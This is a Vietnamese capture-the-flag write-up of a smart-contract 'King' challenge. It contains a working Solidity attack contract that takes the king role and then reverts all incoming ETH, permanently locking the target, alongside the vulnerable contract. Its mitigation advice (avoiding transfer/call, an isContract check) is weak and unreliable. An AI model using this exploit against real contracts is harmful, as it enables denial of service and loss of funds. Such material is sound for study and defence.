### Kết luận
- Hàm transfer không được kiểm tra khả năng thực thi khi chuyển ETH đến biến `king`.
- Cách phòng tránh: Tránh sử dụng `transfer` hoặc `call`
- Thực hiện kiểm tra người nắm giữ vai trò mới.
- VD: `require(!isContract(msg.sender));`
### Contract tấn công
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IKing{
    function changeKing(address _newKing) external;
}
contract KingAttack{
    IKing public level;
    constructor(address levelAddress){
        level = IKing(levelAddress);
    }
    function attack() external payable{
        require(msg.value >0, "Must send positive ETH");
        (bool success, ) = payable(address(level)).call{value: msg.value}(""); // ("") là chuỗi dữ liệu rỗng
        require(success, "Call failed!");
    }
    receive() external payable {
        revert("Attack contract cannot receive ETH!"); // Chặn mọi giao dịch gửi ETH
    }
}
```
### Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```
